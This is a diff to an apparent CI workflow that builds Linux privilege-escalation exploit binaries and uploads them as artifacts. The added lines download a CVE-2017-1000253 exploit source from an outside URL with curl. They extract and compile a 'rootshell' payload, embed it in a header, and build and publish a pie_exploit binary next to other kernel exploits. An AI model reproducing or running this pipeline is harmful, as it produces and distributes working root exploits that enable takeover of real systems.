@@ -12,8 +12,12 @@ jobs:
           gcc -static -O2 -o bin/dirtydecrypt src/dirtydecrypt.c -lpthread
           gcc -static -O2 -o bin/fragnesia src/fragnesia.c -lpthread
           gcc -static -O2 -o bin/skb_segment_exploit src/skb_segment_exploit.c -lpthread
-          curl -fsSL -o src/cve-2017-1000253.c https://www.exploit-db.com/download/42887
-          gcc -static -O2 -o bin/pie_exploit src/cve-2017-1000253.c -lpthread || true
+          curl -fsSL -o src/cve-2017-1000253.c https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
+          cd src && sed -n '/^cat > rootshell.c/,/^EOF$/p' cve-2017-1000253.c | sed '1d;$d' > rootshell.c
+          gcc -fpic -shared -nostartfiles -Os -s -o rootshell rootshell.c
+          xxd -i rootshell > rootshell.h
+          gcc -static -O2 -o ../bin/pie_exploit cve-2017-1000253.c -lpthread || true
+          cd ..
           ls -la bin/
           file bin/*
       - name: Upload binaries
@@ -24,4 +28,5 @@ jobs:
             bin/dirtydecrypt
             bin/fragnesia
             bin/skb_segment_exploit
+            bin/pie_exploit
           retention-days: 7
